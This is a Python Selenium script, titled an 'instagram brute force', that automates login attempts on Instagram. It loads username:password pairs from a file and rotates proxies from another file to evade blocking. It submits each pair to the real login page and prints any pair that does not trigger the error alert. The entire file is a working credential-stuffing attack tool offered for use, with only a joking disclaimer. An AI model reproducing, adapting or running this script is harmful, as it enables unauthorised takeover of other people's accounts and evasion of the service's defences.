from selenium import webdriver
from selenium.webdriver.firefox.firefox_profile import FirefoxProfile
import time
import os
def userid():
	print("""
[*] founded.
[!] userid : %s
[!] userpw : %s

			"""%(user_id,user_pw))

print("[*] you need to install selenium and selenium browser tool.")
time.sleep(5)
os.system("cls")
print("""
instagram brute force created by $bash.
	ig.com/yigitaydn.py
  dont try at home and mine acc xD!
	""")

profile = FirefoxProfile()
proxys = open("proxys.txt","r")
idpw = open("idpw.txt","r")
wordlist = []
proxy = []
useragent = []
for r in proxys:
	proxy.append(r)
for i in idpw:
	for x in proxy:
		whitelist = x.split(":")
		ip = whitelist[0]
		port = whitelist[1]
		ip = str(ip)
		proxy.remove(x)
		proxy.append(x)
		port = int(port)
		profile.set_preference("network.proxy.type", 1)
		profile.set_preference("network.proxy.http", ip)
		profile.set_preference("network.proxy.http_port", port)
		profile.set_preference("network.proxy.ssl", ip)
		profile.set_preference("network.proxy.ssl_port", port)
		profile.update_preferences()
	driver = webdriver.Firefox(firefox_profile= profile)
	wordlist = i.split(":")
	user_id = wordlist[0]
	user_pw = wordlist[1]
	try:
		driver.get("https://www.instagram.com/accounts/login/")
	except:
		print("Proxy Error! IP: %s PORT: %s" %(ip,port))
	time.sleep(3)
	username = driver.find_element_by_name("username")
	passaword= driver.find_element_by_name("password")
	button = driver.find_element_by_xpath("/html/body/span/section/main/div/article/div/div[1]/div/form/div[4]/button")
	username.send_keys(user_id)
	passaword.send_keys(user_pw)
	time.sleep(1)
	button.click()
	time.sleep(2)
	try:
		driver.find_element_by_xpath("//*[@id='slfErrorAlert']")
	except IndexError:
		print("cannotfound.")
	except:
		userid()
		break
	driver.close()
